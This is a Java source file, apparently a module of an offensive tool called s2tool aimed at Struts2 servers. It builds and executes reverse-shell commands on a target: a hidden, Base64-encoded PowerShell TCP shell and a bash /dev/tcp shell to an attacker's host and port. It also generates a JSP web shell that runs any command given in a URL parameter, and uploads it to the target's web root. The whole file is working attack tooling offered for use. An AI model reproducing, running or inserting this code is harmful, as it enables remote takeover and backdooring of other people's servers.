package com.s2tool.modules;

import com.s2tool.core.HttpClient;
import com.s2tool.core.Target;
import com.s2tool.utils.Logger;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * 高级利用模块：反弹 Shell、Webshell 一键生成与上传。
 */
public class Advanced {

    private final HttpClient http;
    private final Target target;
    private final Executor executor;
    private final InfoGather info;
    private final FileManager fileManager;

    public Advanced(HttpClient http, Target target) {
        this.http = http;
        this.target = target;
        this.executor = new Executor(http, target);
        this.info = new InfoGather(http, target);
        this.fileManager = new FileManager(http, target);
    }

    /**
     * 反弹 Shell。
     *
     * @param lhost 攻击机监听 IP
     * @param lport 攻击机监听端口
     * @param os    "auto" / "linux" / "windows"
     * @return 构造的命令
     */
    public String reverseShell(String lhost, int lport, String os) {
        String actualOs = "auto".equalsIgnoreCase(os) ? info.detectOs() : os;
        String cmd;
        if ("windows".equalsIgnoreCase(actualOs)) {
            // PowerShell 反弹（Base64 编码）
            String ps = "$client=New-Object System.Net.Sockets.TCPClient('" + lhost + "'," + lport
                    + ");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};"
                    + "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){"
                    + "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
                    + "$sendback=(iex $data 2>&1|Out-String);"
                    + "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
                    + "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
                    + "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
                    + "$client.Close()";
            String encoded = Base64.getEncoder().encodeToString(
                    ps.getBytes(StandardCharsets.UTF_16LE));
            cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " + encoded;
        } else {
            // Linux：bash /dev/tcp 反弹，显式 bash -c 确保 Bash 环境
            cmd = "bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'";
        }
        Logger.info("目标系统: " + actualOs);
        Logger.info("反弹命令已构造，请确保攻击机已监听 " + lhost + ":" + lport);
        // 反弹命令是阻塞的：bash -i / powershell 会持续尝试连接。
        // 因此无论超时还是立即返回，都视为"命令已发送"；
        // 连接失败通常表现为目标侧命令报错（如 /dev/tcp 不可用）。
        Executor.ExecResult r = executor.exec(cmd, 5000);
        if (r.isSuccess() && r.getOutput() != null && !r.getOutput().trim().isEmpty()
                && !r.getOutput().contains("No such file") && !r.getOutput().contains("not found")) {
            return "反弹 Shell 命令已发送（无回显属正常现象）。若连接失败，请检查监听和防火墙";
        }
        if (r.getOutput() != null && r.getOutput().contains("not found")) {
            return "反弹命令执行失败，目标环境可能不支持该方式: " + r.getOutput().trim();
        }
        // 超时/阻塞属于反弹命令的正常行为
        return "反弹 Shell 命令已发送（命令阻塞等待连接中）。若长时间未连接，请检查监听和防火墙";
    }

    /**
     * 生成 JSP Webshell 内容（明文 ?CMD= 风格，浏览器直接访问即可执行命令）。
     *
     * <p>统一访问方式：<code>http://target/shell.jsp?CMD=whoami</code></p>
     *
     * @return JSP 内容
     */
    public static String generateJspWebshell() {
        return "<%@ page import=\"java.util.*,java.io.*\" %>\n"
                + "<%!\n"
                + "public static void x(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response){\n"
                + "  try{\n"
                + "    String p=\"CMD\"; String cmd=request.getParameter(p);\n"
                + "    if(cmd!=null){\n"
                + "      String os=System.getProperty(\"os.name\").toLowerCase();\n"
                + "      String[] c=os.contains(\"win\")?new String[]{\"cmd.exe\",\"/c\",cmd}:new String[]{\"/bin/sh\",\"-c\",cmd};\n"
                + "      Process proc=new ProcessBuilder(c).redirectErrorStream(true).start();\n"
                + "      java.io.InputStream is=proc.getInputStream();\n"
                + "      ByteArrayOutputStream baos=new ByteArrayOutputStream(); byte[] b=new byte[4096]; int n;\n"
                + "      while((n=is.read(b))!=-1){baos.write(b,0,n);}\n"
                + "      response.setContentType(\"text/html;charset=UTF-8\");\n"
                + "      response.getWriter().print(new String(baos.toByteArray(),\"UTF-8\"));\n"
                + "    } else { response.getWriter().print(\"param: \"+p); }\n"
                + "  }catch(Exception e){ try{ response.getWriter().print(\"ERR:\"+e.getMessage()); }catch(Exception ex){} }\n"
                + "}\n"
                + "%>\n"
                + "<% x(request,response); %>\n";
    }

    /**
     * 一键生成并上传 Webshell。
     *
     * @param fileName 文件名（如 shell.jsp）
     * @param method 上传方式 ognl/cmd
     * @return 上传结果
     */
    public String uploadWebshell(String fileName, String method) {
        String jsp = generateJspWebshell();
        String root = info.getWebRoot();
        if (root == null) {
            return "获取 Web 根目录失败，无法确定上传路径";
        }
        String remotePath = root.endsWith("/") ? root + fileName : root + "/" + fileName;
        // 写临时文件再上传
        String tmp = System.getProperty("java.io.tmpdir") + java.io.File.separator + "s2tool_ws_" + System.nanoTime() + ".jsp";
        try {
            Files.write(Paths.get(tmp), jsp.getBytes(StandardCharsets.UTF_8));
        } catch (IOException e) {
            return "生成临时 Webshell 文件失败: " + e.getMessage();
        }
        String result = fileManager.upload(tmp, remotePath, method);
        try {
            Files.deleteIfExists(Paths.get(tmp));
        } catch (IOException ignored) {}
        if (result.startsWith("上传成功")) {
            String accessUrl = target.getBaseUrl() + "/" + fileName;
            result += "\nWebshell 访问地址: " + accessUrl + "?CMD=whoami";
            result += "\n用法: 浏览器访问 " + accessUrl + "?CMD=<命令> 即可执行命令";
        }
        return result;
    }
}
